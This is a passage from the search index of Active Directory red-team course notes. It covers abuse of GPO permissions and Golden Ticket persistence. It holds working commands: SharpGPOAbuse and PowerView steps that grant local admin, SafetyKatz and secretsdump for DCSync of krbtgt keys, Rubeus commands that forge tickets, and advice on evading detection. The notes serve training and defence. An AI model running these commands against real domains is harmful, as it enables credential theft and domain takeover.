| Computers | Security settings (e.g., disable USB, enforce firewall rules), startup/shutdown scripts, software installation, registry changes. | Users | Password complexity, logon/logoff scripts, drive mappings, desktop background, access to Control Panel. | 📌 When a computer starts up, computer policies apply. When a user logs in, user policies apply."},{"id":"what-is-a-gpo-group-policy-object","u":"02_permissions-abuse.html#what-is-a-gpo-group-policy-object","sec":"Permissions Abuse","lvl":4,"t":"3. What is a GPO (Group Policy Object)?","c":"A GPO is the container for all these policy settings. GPO stands for Group Policy Object . It’s a set of rules and configurations in Active Directory that control how users and computers behave in a Windows domain. Think of it like a file that holds a bunch of rules . Example: A GPO named “Password Policy” might include: Minimum password length = 12 Password must include numbers and symbols"},{"id":"where-gpos-live","u":"02_permissions-abuse.html#where-gpos-live","sec":"Permissions Abuse","lvl":4,"t":"Where GPOs Live:","c":"Two parts : Group Policy Container (GPC) — stored in Active Directory Holds metadata: version numbers, GPO links, security filtering. Group Policy Template (GPT) — stored in SYSVOL (shared folder on Domain Controllers) Holds the actual settings files: registry.pol, scripts, ADM templates, etc. image.png In above image APPLOCKER is the GPO"},{"id":"what-can-a-gpo-do","u":"02_permissions-abuse.html#what-can-a-gpo-do","sec":"Permissions Abuse","lvl":4,"t":"What Can a GPO Do?","c":"Configure security policies (e.g., password length, lockout time). Deploy software automatically. Run scripts on logon/logoff/startup/shutdown. Restrict access to system tools. Configure firewall, RDP, and service settings. Inshort: Group Policy = the concept (rules) GPO = the object (container holding those rules)"},{"id":"linking-gpos","u":"02_permissions-abuse.html#linking-gpos","sec":"Permissions Abuse","lvl":4,"t":"4. Linking GPOs","c":"You can link a GPO to three main AD container levels: Domain — affects all users/computers in the domain. Site — affects all users/computers in a physical site. Organizational Unit (OU) — affects only those in that OU (and sub-OUs). Example: If you link a GPO to Sales OU , only the Sales department users/computers get those policies."},{"id":"organizational-units-ous","u":"02_permissions-abuse.html#organizational-units-ous","sec":"Permissions Abuse","lvl":4,"t":"5. Organizational Units (OUs)","c":"OUs (Organizational Units) are containers within a domain used to organize users, computers, and groups . An OU is the lowest-level container where you can apply GPOs. They are also used for delegating administration — you can allow certain IT staff to manage only a specific OU (e.g., only “HR Department” computers). This helps split responsibilities and prevent one admin from having full domain control. Note:- all student user account are in the default “Users” container of the DOLLARCORP.MONEYCORP.LOCAL domain, not in an Organizational Unit (OU) . You only get GPOs that are linked to the domain or site. OU-specific policies won’t affect you because you are in the default Users container and you are not part of any OU. image.png"},{"id":"security-implications-why-gpos-matter-in-attacks","u":"02_permissions-abuse.html#security-implications-why-gpos-matter-in-attacks","sec":"Permissions Abuse","lvl":4,"t":"6. Security Implications — Why GPOs Matter in Attacks","c":"Legit use : They centralize management — admins can roll out changes to hundreds or thousands of machines in seconds. Misconfigured GPOs are a goldmine for attackers because: If a user can modify a GPO linked to systems they don’t own → they can push malicious settings. GPOs can run scripts automatically → an attacker can drop a startup script to execute malware on many systems at once. Attackers can modify security settings (e.g., add themselves to “Local Administrators” group) through GPO. They can be used for persistence (stay hidden even after account resets)."},{"id":"common-attack-scenarios","u":"02_permissions-abuse.html#common-attack-scenarios","sec":"Permissions Abuse","lvl":3,"t":"Common Attack Scenarios","c":"Misconfiguration | Potential Abuse | — | — | GPO linked to critical servers but editable by low-privileged users | Privilege escalation (attacker becomes admin on target machines) | OU-level GPO with weak permissions | Attackers take control of that department’s systems | Scripts stored in GPO not signed or secured | Inject malicious code to run on every affected machine | 💡 In short: GPOs are Active Directory’s remote control for configuring and enforcing policies on domain-joined systems. Great for admins, terrifying when misused. ✅ In short: Group Policy = Centralized configuration system for AD environments. GPO = A package of policy settings, permissions, and scope. OU = The smallest AD container for applying GPOs and delegating admin rights. Security risk = If permissions are too open, GPOs can be abused for privesc, persistence, and mass compromise."},{"id":"how-group-policy-works","u":"02_permissions-abuse.html#how-group-policy-works","sec":"Permissions Abuse","lvl":4,"t":"🏗️ How Group Policy Works","c":"Admins create/edit GPOs (Group Policy Objects) using Group Policy Management Console (GPMC) . Edit the GPO and configure desired settings (user policies, computer policies). Link/apply the GPO to a site , domain , or OU (Organizational Units) where the target users/computers reside. The Group Policy Client on each computer downloads and applies the policies periodically (every 90 minutes by default). You can force it using gpupdate /force . Real-World Use Case in AD Environment Company wants to enforce password complexity → set it in a domain GPO . Disable access to USB ports for all interns → apply a GPO to the “Interns OU” . Map a shared drive (Z:) for all users → set it in User Configuration > Preferences > Drive Maps ."},{"id":"group-policy-as-an-attack-vector","u":"02_permissions-abuse.html#group-policy-as-an-attack-vector","sec":"Permissions Abuse","lvl":4,"t":"⚠️ Group Policy as an Attack Vector","c":"GPOs can be abused by attackers for: Privilege Escalation – Add accounts to privileged groups via GPO. Persistence – Use logon/startup scripts to run backdoors or malware. Backdoors – Push malicious scheduled tasks or tools across endpoints. Security Bypass – Disable antivirus, firewall, or auditing logs. 🧠 Example : An attacker with GPO edit access adds a PowerShell payload to a logon script, compromising all systems in the targeted OU. Note:- Using the command line tool from powerview you can list group policies, but you cannot list the settings"},{"id":"get-list-of-gpo-in-current-domain.","u":"02_permissions-abuse.html#get-list-of-gpo-in-current-domain.","sec":"Permissions Abuse","lvl":4,"t":"Get list of GPO in current domain.","c":"Get-DomainGPO Lists all Group Policy Objects (GPOs) in the current domain. image.png Filter the output to only shows the Group Policy Objects name: Get-DomainGPO | select DisplayName image.png you can only view the GPO name but cannot view the policies being applied by each GPO, eg: you cannot view the policies applied by applocker Note: - Tools like GP result or RSOP can only show group policy of current machine and not of remote machine Get a Specific GPO’s Details: Get-DomainGPO -Identity \"DevOps Policy\" Output (example): displayname : DevOps Policy gpcfilesyspath : \\\\corp.local\\SysVol\\corp.local\\Policies\\{0BF8D01C-1F62-4BDC-958C-57140B67D147} objectguid : 0bf8d01c-1f62-4bdc-958c-57140b67d147 whencreated : 7/01/2025 02:34:56 PM whenchanged : 8/05/2025 09:15:12 AM versionnumber : 12 distinguishedname : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=corp,DC=local gpcfilesyspath is the path where the GPO’s settings files live — critical for GPOddity abuse. distinguishedname is the LDAP path for AD metadata. Get-DomainGPO -ComputerIdentity dcorp-student1 → **Shows only the GPOs that apply to a specific computer, such as dcorp-student1 . Get GPO(s) which use Restricted Groups or groups.xml for interesting users: **Get-DomainGPOLocalGroup** ** This command finds Group Policy Objects (GPOs) that modify local group memberships, such as adding users to the local Administrators on domain-joined machines. It specifically looks for: Restricted Groups Groups.xml (used by Group Policy Preferences) These are methods used by admins (and sometimes attackers) to add or remove users/groups from local groups , especially local Administrators . Why It Matters (Red Team Perspective): An attacker with write access to a GPO can use it to: Add themselves (or another user) to the Administrators group on all systems where the GPO is applied. Achieve stealthy privilege escalation or persistence without touching the machine directly. Example: There is an Organizational Unit (OU) named Workstation , which contains 100 domain-joined devices . Due to security compliance , enabling or managing local Administrator accounts manually on each of the 100 devices is not feasible or allowed . So, a new Group Policy Object (GPO) is created called Workstation-Admin . This GPO uses Restricted Groups to: Modify the local Administrators group on all devices in the Workstation OU. Add a specific domain group, e.g., CORP\\WorkstationAdminGroup , to the Administrators group on each workstation. This GPO is linked to the Workstation OU , which means it will be enforced on all 100 devices within the OU. As a result, any user added to CORP\\WorkstationAdminGroup will now have local admin rights on all 100 systems ."},{"id":"domain-enumeration---gpo","u":"02_permissions-abuse.html#domain-enumeration---gpo","sec":"Permissions Abuse","lvl":3,"t":"Domain Enumeration - GPO","c":"Get users which are in a local group of a machine using GPO: Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1 This command checks which users or groups are being added to the local groups (like Administrators) on a specific machine ( dcorp-student1 ) via Group Policy . 🔍 How it works : It analyzes GPOs applied to the target machine. Especially looks at GPOs that use Restricted Groups or Groups.xml to assign users to local groups. Shows what local group modifications are happening through GPOs (not manually set). Get machines where the given user is member of a specific group: Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose ✅ Purpose : This command finds which machines a specific user (e.g., student1 ) is being added to local groups on, through Group Policy . 🔍 How it works : It maps GPOs that add the specified user to local groups on various computers . Helps track where this user has elevated permissions via GPO. 📌 Use case : You want to find out: 👉 “On which machines does student1 get local admin or group access via GPO?”"},{"id":"why-this-is-important-for-red-teaming","u":"02_permissions-abuse.html#why-this-is-important-for-red-teaming","sec":"Permissions Abuse","lvl":3,"t":"🔐 Why This Is Important for Red Teaming:","c":"These mappings often reveal privileged access across systems. If a GPO adds a user to the local Administrators group on 100 machines, that GPO (or the user) is an attractive lateral movement or privilege escalation target . Attackers can look for misconfigured or overly permissive GPOs that give unintended admin rights ."},{"id":"abuse-logic","u":"02_permissions-abuse.html#abuse-logic","sec":"Permissions Abuse","lvl":3,"t":"Abuse Logic","c":""},{"id":"what-rights-are-needed-for-gpo-abuse","u":"02_permissions-abuse.html#what-rights-are-needed-for-gpo-abuse","sec":"Permissions Abuse","lvl":4,"t":"🔐 What Rights Are Needed for GPO Abuse?","c":"To abuse a GPO, you need write-level control over it."},{"id":"common-abusable-rights","u":"02_permissions-abuse.html#common-abusable-rights","sec":"Permissions Abuse","lvl":4,"t":"✅ Common Abusable Rights","c":"Right | Meaning | Abuse Possible? | — | — | — | GenericAll | Full control | ✅ YES | GenericWrite | Modify attributes | ✅ YES | WriteDACL | Change permissions | ✅ YES (indirect) | WriteOwner | Take ownership | ✅ YES (indirect) |"},{"id":"scenario-1-genericall-direct-control","u":"02_permissions-abuse.html#scenario-1-genericall-direct-control","sec":"Permissions Abuse","lvl":4,"t":"🔥 SCENARIO 1 — GenericAll (DIRECT CONTROL)","c":"🎯 Situation You are: domain\\user1 BloodHound shows: user1 → GenericAll → \"Workstation GPO\" 💣 What You Do 👉 You already have full control → no setup needed Run: SharpGPOAbuse.exe --AddComputerScript \\ --ScriptName addadmin.bat \\ --ScriptContents \"net localgroup administrators user1 /add\" \\ --GPOName \"Workstation GPO\" ⚙️ What Happens Internally Script gets added in: \\\\domain\\SYSVOL\\Policies\\{GPO_GUID}\\Machine\\Scripts\\Startup\\ GPO is updated to execute it 💀 Result After GPO refresh: user1 becomes LOCAL ADMIN on all machines in that GPO 🧠 Key Understanding 👉 You directly changed the GPO → instant abuse"},{"id":"scenario-2-genericwrite-modify-settings","u":"02_permissions-abuse.html#scenario-2-genericwrite-modify-settings","sec":"Permissions Abuse","lvl":4,"t":"🔥 SCENARIO 2 — GenericWrite (MODIFY SETTINGS)","c":"🎯 Situation user1 → GenericWrite → \"Workstation GPO\" ⚠️ Important Difference 👉 You can modify GPO settings , but not full control like GenericAll"},{"id":"what-you-do","u":"02_permissions-abuse.html#what-you-do","sec":"Permissions Abuse","lvl":4,"t":"💣 What You Do","c":"Step 1 — Add script reference in GPO You modify GPO attribute to say: Run this script at startup → evil.bat Step 2 — Place your script in SYSVOL echo net localgroup administrators user1 /add > evil.bat Put it in: \\\\domain\\SYSVOL\\Policies\\{GPO_GUID}\\Machine\\Scripts\\Startup\\"},{"id":"what-happens","u":"02_permissions-abuse.html#what-happens","sec":"Permissions Abuse","lvl":4,"t":"⚙️ What Happens","c":"GPO now points to your script Machines execute it"},{"id":"result-3","u":"02_permissions-abuse.html#result-3","sec":"Permissions Abuse","lvl":4,"t":"💀 Result","c":"Same: user1 → local admin everywhere"},{"id":"key-difference","u":"02_permissions-abuse.html#key-difference","sec":"Permissions Abuse","lvl":4,"t":"🧠 Key Difference","c":"👉 You didn’t fully control GPO 👉 You modified its behavior"},{"id":"scenario-3-writedacl-permission-escalation","u":"02_permissions-abuse.html#scenario-3-writedacl-permission-escalation","sec":"Permissions Abuse","lvl":4,"t":"🔥 SCENARIO 3 — WriteDACL (PERMISSION ESCALATION)","c":"🎯 Situation user1 → WriteDACL → \"Workstation GPO\" 🧠 What This Means 👉 You CANNOT modify GPO yet But you CAN: Change who has permissions"},{"id":"what-you-do-1","u":"02_permissions-abuse.html#what-you-do-1","sec":"Permissions Abuse","lvl":4,"t":"💣 What You Do","c":"Step 1 — Give yourself full control Add-DomainObjectAcl -TargetIdentity \"Workstation GPO\" \\ -PrincipalIdentity user1 \\ -Rights All Step 2 — Now you have: user1 → GenericAll → GPO Step 3 — Abuse like Scenario 1 SharpGPOAbuse.exe ..."},{"id":"result-4","u":"02_permissions-abuse.html#result-4","sec":"Permissions Abuse","lvl":4,"t":"💀 Result","c":"Same: Code execution → local admin everywhere"},{"id":"key-understanding-2","u":"02_permissions-abuse.html#key-understanding-2","sec":"Permissions Abuse","lvl":4,"t":"🧠 Key Understanding","c":"👉 WriteDACL = “I can give myself power”"},{"id":"scenario-4-writeowner-take-ownership","u":"02_permissions-abuse.html#scenario-4-writeowner-take-ownership","sec":"Permissions Abuse","lvl":4,"t":"🔥 SCENARIO 4 — WriteOwner (TAKE OWNERSHIP)","c":"🎯 Situation user1 → WriteOwner → \"Workstation GPO\" 🧠 What This Means 👉 You can change: OWNER of the GPO"},{"id":"what-you-do-2","u":"02_permissions-abuse.html#what-you-do-2","sec":"Permissions Abuse","lvl":4,"t":"💣 What You Do","c":"Step 1 — Become owner Set-DomainObjectOwner -Identity \"Workstation GPO\" \\ -OwnerIdentity user1 Step 2 — As owner → change permissions Add-DomainObjectAcl -TargetIdentity \"Workstation GPO\" \\ -PrincipalIdentity user1 \\ -Rights All Step 3 — Now you have: GenericAll Step 4 — Abuse like Scenario 1"},{"id":"result-5","u":"02_permissions-abuse.html#result-5","sec":"Permissions Abuse","lvl":4,"t":"💀 Result","c":"Same final impact"},{"id":"key-understanding-3","u":"02_permissions-abuse.html#key-understanding-3","sec":"Permissions Abuse","lvl":4,"t":"🧠 Key Understanding","c":"👉 Owner = ultimate control over permissions"},{"id":"final-comparison-super-important","u":"02_permissions-abuse.html#final-comparison-super-important","sec":"Permissions Abuse","lvl":4,"t":"🔥 FINAL COMPARISON (SUPER IMPORTANT)","c":"Right | What you initially can do | What you convert it into | — | — | — | GenericAll | Full control | Direct abuse | GenericWrite | Modify settings | Script execution | WriteDACL | Change permissions | → GenericAll | WriteOwner | Take ownership | → WriteDACL → GenericAll |"},{"id":"golden-ticket-attack","u":"03_persistence.html#golden-ticket-attack","sec":"Persistence","lvl":2,"t":"Golden Ticket Attack","c":""},{"id":"understanding-the-core-concept","u":"03_persistence.html#understanding-the-core-concept","sec":"Persistence","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-is-a-golden-ticket","u":"03_persistence.html#what-is-a-golden-ticket","sec":"Persistence","lvl":3,"t":"🔐 What Is a Golden Ticket?","c":"A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) , which uses the krbtgt account’s secret key to sign the ticket. Since all TGTs are signed by the krbtgt account , having its hash (or AES key) allows an attacker to create arbitrary TGTs for any user — even if that user doesn’t exist."},{"id":"golden-ticket-rule-in-layman-terms","u":"03_persistence.html#golden-ticket-rule-in-layman-terms","sec":"Persistence","lvl":3,"t":"🧱 Golden Ticket Rule (in Layman Terms):","c":"If an attacker has the krbtgt hash (or AES key), the domain SID, and other basic user info (e.g. username, group memberships), they can impersonate any user in the domain by crafting a fake TGT."},{"id":"core-ingredients-for-golden-ticket-attack","u":"03_persistence.html#core-ingredients-for-golden-ticket-attack","sec":"Persistence","lvl":3,"t":"🧱 Core Ingredients for Golden Ticket Attack","c":"You need: Ingredient | Why it’s needed | — | — | krbtgt hash (NTLM or AES256) | To sign the fake TGT (like faking a stamp/seal) | Domain SID | Uniquely identifies the domain | User details (e.g., Administrator) | Who you want to impersonate | Group SIDs | To inherit permissions like Domain Admin | Domain info | e.g., FQDN, NetBIOS, PWDLastSet — for realism | image.png"},{"id":"how-the-golden-ticket-attack-works-step-by-step","u":"03_persistence.html#how-the-golden-ticket-attack-works-step-by-step","sec":"Persistence","lvl":2,"t":"🔧 How the Golden Ticket Attack Works (Step-by-Step)","c":"✅ Step 1: Compromise the Domain Before anything, the attacker must compromise a privileged account , usually a Domain Admin . This gives them access to read the memory or replicate secrets from the Domain Controller. ✅ Step 2: Steal the krbtgt Account Hash The krbtgt account is a special user in every AD domain — it’s used by the Kerberos service to sign Ticket Granting Tickets (TGTs) . The attacker needs the krbtgt password hash , especially the AES256 or NTLM hash , to forge their own TGTs . There are two common ways to get this: Dump LSASS memory on the Domain Controller using Mimikatz or SafetyKatz. Use DCSync to remotely request the krbtgt account’s password data (no code needed on DC). Additonal Information: The krbtgt account is just like any other domain account — it has a password and derived Kerberos keys (NT hash, AES128, AES256, DES, etc.). On a Domain Controller (KDC) , those secrets are stored in Active Directory database (NTDS.dit). Located at: C:\\Windows\\NTDS\\NTDS.dit ✅ Step 3: Forge the Golden Ticket With the krbtgt hash in hand, the attacker uses tools like Rubeus or Mimikatz to forge a TGT . They can craft it to: Impersonate any user (even Administrator). Be a part of any group (like Domain Admins). Add details like password set date, group SIDs, etc., to make it look authentic . Make the ticket valid for 10 years if they want . Additonal Information:- The krbtgt account (which is used by the KDC to sign and encrypt Ticket Granting Tickets) maintains a password history of two previous keys by default . When you perform a Golden Ticket attack and sign a TGT using an old krbtgt AES key (from before a password change), the KDC can still validate and decrypt that TGT because it will try not only the current key but also the last one (sometimes two, depending on configuration). So even if the krbtgt password has been rotated, any ticket forged with one of the valid historical keys will still be accepted until both old keys have been cycled out (e.g., after two password changes). ⚠️ What this means: If an attacker has extracted the krbtgt hash once, they can forge Golden Tickets that remain valid until the krbtgt password has been changed twice . This is why incident response teams are instructed to reset the krbtgt account twice in succession , ensuring all old keys are invalidated. ✅ Step 4: Use the Ticket (God Mode Activated) The attacker injects the forged ticket into memory on their system using /ptt (Pass-the-Ticket). Now, any requests they send to services (like SMB, LDAP, RDP) include this ticket. Since it looks legit, the DC doesn’t challenge it. The attacker now: Accesses sensitive servers Dumps password hashes Moves laterally Dumps or modifies Active Directory itself"},{"id":"why-its-so-dangerous","u":"03_persistence.html#why-its-so-dangerous","sec":"Persistence","lvl":3,"t":"🧬 Why It’s So Dangerous","c":"Reason | Explanation | — | — | Bypasses Passwords & MFA | Doesn’t matter what the user’s password is, or if MFA is enabled. | Fully Offline | Once the ticket is forged, DC is not contacted again unless needed. | Stealthy | No brute force, no malware needed on target — just a valid-looking ticket. | Persistent | As long as krbtgt password remains the same, the attacker can keep forging tickets. | Complete Control | Can impersonate any user, including domain admins, service accounts, etc. | Note:- In real-world assessments, Golden Ticket attacks are typically avoided unless the objective is to test detection capabilities. This is because the attack involves the krbtgt account, which is a highly sensitive system account used by the Kerberos Key Distribution Center. You not find anywhere this account to be logged in accept DC. The primary detection risk in a Golden Ticket attack isn’t the ticket forgery itself, but the act of obtaining the krbtgt hash — which typically requires access to a Domain Admin session on a Domain Controller. Logging in as a Domain Admin, through any machine which is not DC, generates Event ID 4624, which is closely monitored by most EDRs and SIEMs. As a result, this step can easily trigger alerts, making the operation high-risk from an opsec standpoint. Only go after protected group accounts when no option is left because these account are highly monitored."},{"id":"ticket-forged-what-next","u":"03_persistence.html#ticket-forged-what-next","sec":"Persistence","lvl":3,"t":"🔁 3. Ticket Forged – What Next?","c":"Once forged, Rubeus injects it into memory ( /ptt ). Now: You are effectively “logged in” as Administrator . TGT will be accepted as valid by any service in the domain (because it’s signed with krbtgt’s key) You can access file shares , remote desktop , AD data , or run tools like SharpHound , secretsdump , or dcsync . The DC will trust the ticket , even if the real admin changed passwords. The forged TGT remains valid until expiry (usually 10 hours by default ), but you can forge again anytime ."},{"id":"advantage-of-golden-ticket","u":"03_persistence.html#advantage-of-golden-ticket","sec":"Persistence","lvl":3,"t":"Advantage of Golden Ticket","c":""},{"id":"persistance-peroid-of-golden-ticket-attack","u":"03_persistence.html#persistance-peroid-of-golden-ticket-attack","sec":"Persistence","lvl":3,"t":"🔍 Persistance Peroid of Golden Ticket Attack","c":""},{"id":"golden-ticket-persistence","u":"03_persistence.html#golden-ticket-persistence","sec":"Persistence","lvl":3,"t":"1. Golden Ticket Persistence","c":"A Golden Ticket is forged using the krbtgt account hash . Persistence: Valid until the krbtgt account password is changed . By default, krbtgt rarely changes because it’s a sensitive account (resetting can disrupt Kerberos). In most real environments, admins don’t rotate it often → meaning Golden Tickets can last for months/years if unnoticed."},{"id":"the-point-of-forging-a-golden-ticket","u":"03_persistence.html#the-point-of-forging-a-golden-ticket","sec":"Persistence","lvl":3,"t":"🎯 The Point of Forging a Golden Ticket","c":"Persistence (long-term backdoor): DA rights can be removed (your admin user deleted, passwords rotated, etc.). But if you’ve stolen the krbtgt hash, you can always mint a new Golden Ticket on demand — even months later. It’s like having a skeleton key to the domain until the defenders rotate krbtgt twice . Stealth: Using DA account directly leaves traces in event logs (logons, group memberships, etc.). A forged Golden Ticket can impersonate any user or a fake user (with arbitrary groups), making it harder to correlate activities. Flexibility: You don’t have to stick with the DA account you compromised. You can forge tickets for any account (e.g., a service account or a fake user) with any group memberships you want. Example: Forge a ticket for a helpdesk user but sneak in Domain Admins group membership. Bypass of normal credential protections: Even if defenders disable the compromised DA account, you still have unlimited access via forged tickets. This is why Golden Tickets are considered a persistence technique more than just a lateral movement trick. Cross-forest or selective abuse: Sometimes you don’t want to move as “Administrator.” Forging a ticket for a trusted account in a forest/domain trust scenario can be more effective and less noisy."},{"id":"simplified-analogy","u":"03_persistence.html#simplified-analogy","sec":"Persistence","lvl":3,"t":"⚖️ Simplified Analogy","c":"Getting DA = you broke into the bank vault with all the money. Golden Ticket = you made a master key that always works, even if the bank changes the locks or fires the guard who let you in. 👉 So the value isn’t privilege escalation , it’s persistence, stealth, and flexibility ."},{"id":"example---windows","u":"03_persistence.html#example---windows","sec":"Persistence","lvl":3,"t":"Example - Windows","c":""},{"id":"step-by-step-golden-ticket-attack","u":"03_persistence.html#step-by-step-golden-ticket-attack","sec":"Persistence","lvl":3,"t":"🛠️ Step-by-Step Golden Ticket Attack :","c":""},{"id":"obtain-the-krbtgt-account-hash-aes256-key","u":"03_persistence.html#obtain-the-krbtgt-account-hash-aes256-key","sec":"Persistence","lvl":3,"t":"🔑 1. Obtain the krbtgt Account Hash (AES256 key)","c":"This is the most critical step in forging a golden ticket. Method 1: Using SafetyKatz on the DC (as Domain Admin) C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::lsa /patch\" Tool: SafetyKatz (a variant of Mimikatz). What it does: Dumps LSA secrets , including the krbtgt NTLM and AES256 keys . Where: Must be run on the DC with DA privileges . Detection risk: HIGH (needs code execution on the DC). Method 2: Using DCSync (No code execution on DC) C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\" Uses Directory Replication Service (DRS) to fetch the krbtgt hash remotely . Requires DA privileges or replication rights (e.g., Replicating Directory Changes permissions). More stealthy and opsec friendly as no code runs on the DC, it’s just a protocol request ✅ Obtained AES256 Key: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848"},{"id":"forge-the-golden-ticket-using-rubeus","u":"03_persistence.html#forge-the-golden-ticket-using-rubeus","sec":"Persistence","lvl":3,"t":"🧪 2. Forge the Golden Ticket Using Rubeus","c":"You use this krbtgt AES256 key to generate a fake TGT with Rubeus. Option 1: automatic mode with LDAP queries C:\\AD\\Tools\\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd What it does: golden → Instructs Rubeus to forge a Golden Ticket (a fake TGT). /aes256:... → Supplies the AES256 key of the krbtgt account (essential to sign the ticket). /sid:... → Domain SID; required to build the full user SID. /ldap → Makes Rubeus automatically query the Domain Controller via LDAP to pull extra attributes needed for the ticket (like groups, logon count, pwdlastset, etc.). /user:Administrator → Username to impersonate in the forged TGT. /printcmd → Instead of creating the ticket directly, it prints a full “ready to run” forging command with all the discovered attributes. 👉 Here, Rubeus sends 3 LDAP queries to the DC: Gets user account control (UAC) flags for Administrator . Gets group memberships, primary group ID, minPwdAge, maxPwdAge. Gets domain NetBIOS name. This version is very easy but less OPSEC-friendly since the LDAP queries can be logged/monitored. Option 2: manual mode — refined Golden Ticket forging C:\\AD\\Tools\\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:\"11/11/2022 6:33:55 AM\" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt This command forges a Kerberos Ticket Granting Ticket (TGT) for the Administrator user, signs it with the krbtgt AES256 hash , and then injects it directly into memory ( /ptt ) so the current session can use it for domain access without needing a real password. 👉 This command does not query LDAP . Instead, you supply all required attributes yourself — making it more stealthy/OPSEC friendly . ✅ Explanation of Key Parameters : Parameter | Meaning / Purpose | — | — | Rubeus.exe golden | Invokes the Golden Ticket forging module in Rubeus | /aes256:<hash> | The AES256 key of the krbtgt account — used to sign the fake TGT so it appears valid to the DC | /user:Administrator | The username the ticket will impersonate (in this case, the domain admin account) | /id:500 | RID (Relative ID) of the Administrator account in AD (500 = default RID for built-in admin) | /pgid:513 | Primary Group ID — usually 513 = Domain Users | /domain:dollarcorp.moneycorp.local | Fully Qualified Domain Name (FQDN) of the AD domain | /sid:S-1-5-21-... | The Domain SID — critical for forging valid tickets | /pwdlastset:\"11/11/2022 6:33:55 AM\" | Timestamp indicating when the password was last set (optional cosmetic realism) | /minpassage:1 | Minimum password age in days (optional, helps look like a legit ticket) | /logoncount:2453 | Number of times the user has logged on (also for realism) | /netbios:dcorp | The NetBIOS name of the domain (short name) | /groups:544,512,520,513 | The group RIDs the user belongs to:🔹 544 = Administrators🔹 512 = Domain Admins🔹 520 = Enterprise Admins🔹 513 = Domain UsersThis makes the forged ticket grant high-level access | /dc:DCORP-DC.dollarcorp.moneycorp.local | The FQDN of the Domain Controller to target or contact | /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD | UserAccountControl flags — e.g. normal account, password never expires | /ptt or /ticket | Pass-the-Ticket(/ptt) : injects the forged ticket into the current session’s memory (no need to save it to disk) /ticket - saves ticket to a file for later usage | “When forging a Golden Ticket, make sure its lifetime matches the target environment. By default, Kerberos tickets last about 10 hours, but tools like Mimikatz may create tickets that last for 10 years, which can be easily detected. To stay stealthy, set a realistic lifetime using options like /endin:"},{"id":"what-if-we-impersonate-a-non-existing-user","u":"03_persistence.html#what-if-we-impersonate-a-non-existing-user","sec":"Persistence","lvl":2,"t":"What if we impersonate a non-existing user ?","c":"Surprisingly: ✅ It can still work. Because during TGS validation , the KDC mainly checks: Is the TGT correctly signed with krbtgt key? It does not always verify the user exists in AD . So the ticket could contain: username = hacker123 RID = 5000 And the KDC may still issue service tickets."},{"id":"why-this-is-possible","u":"03_persistence.html#why-this-is-possible","sec":"Persistence","lvl":3,"t":"5️⃣ Why This Is Possible","c":"Kerberos is stateless regarding TGT issuance . The KDC does not store issued tickets . Instead it just: decrypt TGT using krbtgt key If decryption succeeds: ticket = trusted That’s it."},{"id":"but-in-practice-attackers-avoid-fake-users","u":"03_persistence.html#but-in-practice-attackers-avoid-fake-users","sec":"Persistence","lvl":3,"t":"6️⃣ But In Practice Attackers Avoid Fake Users","c":"Even though it works, operators usually impersonate real accounts . Reasons: 1️⃣ Logging anomalies Logs may show: User: hacker123 but that user doesn’t exist in AD. SOC tools can detect that. 2️⃣ Some services perform directory checks Some applications query AD: Does this user exist? If not → access denied. 3️⃣ SID mismatch detection A forged user might produce strange SIDs like: S-1-5-21-xxx-xxx-xxx-9999 which defenders can flag."},{"id":"realistic-attacker-strategy","u":"03_persistence.html#realistic-attacker-strategy","sec":"Persistence","lvl":3,"t":"7️⃣ Realistic Attacker Strategy","c":"Instead attackers usually forge tickets for: existing admin accounts service accounts regular users with admin groups Example: svc_backup helpdesk_admin dbadmin This blends into normal activity"},{"id":"example---linux","u":"03_persistence.html#example---linux","sec":"Persistence","lvl":3,"t":"Example - Linux","c":""},{"id":"step-1-obtain-the-krbtgt-hash","u":"03_persistence.html#step-1-obtain-the-krbtgt-hash","sec":"Persistence","lvl":2,"t":"🔑 Step 1 — Obtain the krbtgt Hash","c":"The Golden Ticket requires the hash/key of the krbtgt account , because: The KDC signs all TGTs using the krbtgt key. If you have the key, you can sign your own TGT , and the Domain Controller will trust it."},{"id":"method-1-using-dcsync-most-common","u":"03_persistence.html#method-1-using-dcsync-most-common","sec":"Persistence","lvl":2,"t":"Method 1 — Using DCSync (Most Common)","c":"From Linux using Impacket : impacket-secretsdump pirate.htb/administrator:'Password@123!'@DC01.pirate.htb or using pass-the-hash impacket-secretsdump-hashes :NTLMHASH pirate.htb/administrator@DC01.pirate.htb"},{"id":"what-happens-internally","u":"03_persistence.html#what-happens-internally","sec":"Persistence","lvl":3,"t":"What happens internally","c":"secretsdump performs a DCSync attack . It asks the DC: “Hey, I am a domain controller. Send me replication data.” The DC sends password hashes of domain users , including: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:154cb6624b1d859f7080a6615adc488f Important values: Field | Meaning | — | — | 502 | RID of krbtgt | NTLM hash | used for signing Kerberos tickets |"},{"id":"example-output","u":"03_persistence.html#example-output","sec":"Persistence","lvl":3,"t":"Example Output","c":"[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe krbtgt:502:aad3b435b51404eeaad3b435b51404ee:154cb6624b1d859f7080a6615adc488f You extract: krbtgt NTLM hash or AES keys if present."},{"id":"step-2-gather-domain-information","u":"03_persistence.html#step-2-gather-domain-information","sec":"Persistence","lvl":3,"t":"🧪 Step 2 — Gather Domain Information","c":"To forge a Golden Ticket you need: 